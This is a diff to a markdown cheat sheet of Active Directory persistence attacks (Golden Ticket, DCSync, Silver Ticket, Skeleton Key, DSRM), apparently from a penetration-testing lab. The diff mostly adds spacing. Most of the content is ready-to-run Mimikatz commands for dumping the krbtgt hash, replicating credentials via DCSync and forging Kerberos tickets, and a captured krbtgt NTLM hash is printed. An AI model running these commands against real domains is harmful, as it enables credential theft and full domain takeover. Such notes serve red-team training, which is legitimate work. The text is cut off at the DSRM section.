@@ -1,4 +1,6 @@
 **Golden Ticket:**
+
+
 Once we get inside DC with the privileges of Domain Administrator, we can execute following command to get krbtgt hash:
 ```Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC_computer>```
 
@@ -6,28 +8,34 @@ Once we get the hash of krbtgt account, we can generate our own TGT using:
 ```Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt_hash> id:<id> /groups:<group_id_optional> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'```
 
 > Found the following creds of krbtgt:
-RID  : 000001f6 (502)
-User : krbtgt
-LM   :
-NTLM : ff46a9d8bd66c6efd77603da26796f35
+> RID  : 000001f6 (502)
+> User : krbtgt
+> LM   :
+> NTLM : ff46a9d8bd66c6efd77603da26796f35
 
 To see currently stored tickets:
 ``` klist```
 
 
 **DCSync**
+
+
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<username>"'```
 Example: ```Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'```
 
 
 
 **Silver Ticket:**
+
+
 Golden ticket creates a TGT using krbtgt's hash, but Silver ticket attack creates a TGS using the hash of the service to be approached.
 
 ```Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain_name> /sid:<sid> /target:<target_host_where_service_is_being_used> /service:<service_name> /rc4:<password_hash_for_machine_account> /user:<username> /ptt"'```
 
 
 **Skeleton Key:**
+
+
 Using skeleton key malware(attack/technique), the script modifies the LSASS(which handles the security and auth stuff in AD) gets modified and a secret key/password is made valid for every account other than their original password.
 That secret key can be used to access any account.
 
@@ -39,6 +47,8 @@ As soon as the DC restarts, the skeleton key is removed.
 
 
 **DSRM(Directory Service Restore Mode):**
+
+
 When a computer is promoted to Domain Controller, a DSRM password is set which is the local admin password of that computer.
 It can be extracted using:
 
